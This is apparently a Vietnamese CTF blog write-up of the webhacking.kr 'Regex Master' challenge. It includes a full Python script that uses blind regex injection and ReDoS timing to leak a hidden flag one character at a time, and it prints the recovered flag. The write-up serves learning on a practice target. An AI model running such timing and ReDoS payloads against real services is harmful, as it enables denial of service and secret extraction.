---
title: Regex Master - webhacking.kr
description: From webhacking.kr
author: to^
date: 2022-04-02 2:39:00 +0700
categories: [WecSec, CTF, webhacking.kr]
tags: [timing attack, blind attack]     # TAG names should always be lowercase
img_path: /assets/img/
image:
 src: blind_re_inject/webhackingkr_logo.png
 alt: webhackingkr logo
 width: 1000
 height: 400
---

## _Link challenge_
<http://regexmaster.webhacking.kr>

## _Source code_
![source_code](blind_re_inject/source_code.png)
_source code_

## _Phân tích_
Ở bài này source code rất đơn giản, chỉ kiểm tra xem biến flag có chứa chuỗi `parttern` (nhận từ GET request) hay không mà không hề xuất ra kết quả hay output nào khác.
Sau một hồi suy nghĩ thì mình quyết định thử khai thác bằng `blind regex injection` + `timing attack`
Để hiểu chi tiết hơn về kĩ thuật này các bạn có thể [đây](https://diary.shift-js.info/blind-regular-expression-injection/)

## _Khai thác_
```py
import requests
import sys
import time
import random
import string
import re

# constants
THRESHOLD = 1
url = 'http://regexmaster.webhacking.kr/?pattern='
# predicates


def length_is(n):
    return ".{" + str(n) + "}$"


def nth_char_is(n, c):
    if c == '/':
        return ".{" + str(n-1) + "}" + '\/' + ".*$"
    if c == '\\':
        return ".{" + str(n-1) + "}" + '\\\\' + ".*$"
    return ".{" + str(n-1) + "}" + re.escape(c) + ".*$"

# utilities


def redos_if(regexp, salt):
    return "^(?={})(((((.*)*)*)*)*)*{}".format(regexp, salt)


def get_request_duration(payload):
    # print(payload)
    try:
        r = requests.get(url+payload)
        duration = r.elapsed.total_seconds()
    except:
        duration = -1
        exit(1)
    # print(duration)
    return duration


def prop_holds(prop, salt):
    return get_request_duration(redos_if(prop, salt)) > THRESHOLD


def generate_salt():
    return ''.join([random.choice(string.ascii_letters) for i in range(10)])


# exploit
if __name__ == '__main__':
    # generating salt
    salt = generate_salt()
    while not prop_holds('.*', salt):
        salt = generate_salt()
    print("[+] salt: {}".format(salt))

    # leak length
    upper_bound = 100
    secret_length = 0
    for i in range(0, upper_bound):
        if prop_holds(length_is(i), salt):
            secret_length = i
            break
    print("[+] length: {}".format(secret_length))

    flag = "FLAG{"
    for i in range(5, secret_length):
        stop = 0
        for c in range(32, 128):
            if prop_holds(nth_char_is(i+1, chr(c)), salt):
                flag += chr(c)
                print("[*] {}".format(flag))
                stop = 1
                break
    print("[+] Flag: {}".format(flag))  
```

> FLAG{im_r/e/g/e/x_master//_//}
{: .prompt-info  }
## _Tham khảo_
<https://diary.shift-js.info/blind-regular-expression-injection>
